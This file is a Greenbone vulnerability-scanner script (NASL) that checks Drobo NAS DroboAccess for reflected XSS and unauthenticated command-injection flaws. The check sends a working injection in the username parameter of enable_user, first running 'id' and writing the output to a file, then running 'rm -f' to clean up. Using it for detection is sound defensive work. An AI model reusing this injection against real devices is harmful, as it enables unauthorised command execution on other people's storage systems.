# Copyright (C) 2019 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.142107");
  script_version("2021-08-27T12:01:24+0000");
  script_tag(name:"last_modification", value:"2021-08-27 12:01:24 +0000 (Fri, 27 Aug 2021)");
  script_tag(name:"creation_date", value:"2019-03-08 12:09:22 +0700 (Fri, 08 Mar 2019)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)");

  script_cve_id("CVE-2018-14697", "CVE-2018-14698", "CVE-2018-14699", "CVE-2018-14701");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Drobo NAS Multiple Vulnerabilities in DroboAccess");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2019 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_drobo_nas_consolidation.nasl");
  script_mandatory_keys("drobo/droboaccess/detected");

  script_tag(name:"summary", value:"Drobo NAS are prone to multiple vulnerabilities in DroboAccess.");

  script_tag(name:"insight", value:"Drobo NAS are prone to multiple vulnerabilities in DroboAccess:

  - Reflected Cross-Site Scripting in enable_user (CVE-2018-14697)

  - Reflected Cross-Site Scripting in delete_user (CVE-2018-14698)

  - Unauthenticated Command Injection in username parameter in enable_user (CVE-2018-14699)

  - Unauthenticated Command Injection in username parameter in delete_user (CVE-2018-14701)");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_xref(name:"URL", value:"https://blog.securityevaluators.com/call-me-a-doctor-new-vulnerabilities-in-drobo5n2-4f1d885df7fc");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_kb_item("drobo/droboaccess/port"))
  exit(0);

vt_strings = get_vt_strings();
file = vt_strings["default_rand"];

url = "/DroboAccess/enable_user?username=test';/usr/bin/id%20>%20" + file +"'&enabled=true";

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req);

if (res !~ "^HTTP/1\.[01] 200")
  exit(0);

url = "/DroboAccess/" + file;

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if (res =~ 'uid=[0-9]+.*gid=[0-9]+') {
  report = 'It was possible to execute the "id" command.\n\nResult:\n\n' + res;
  security_message(port: port, data: report);

  # Cleanup
  url = "/DroboAccess/enable_user?username=test';/bin/rm%20-f%20" + file + "'&enabled=true";

  req = http_get(port: port, item: url);
  http_keepalive_send_recv(port: port, data: req);

  exit(0);
}

exit(0);
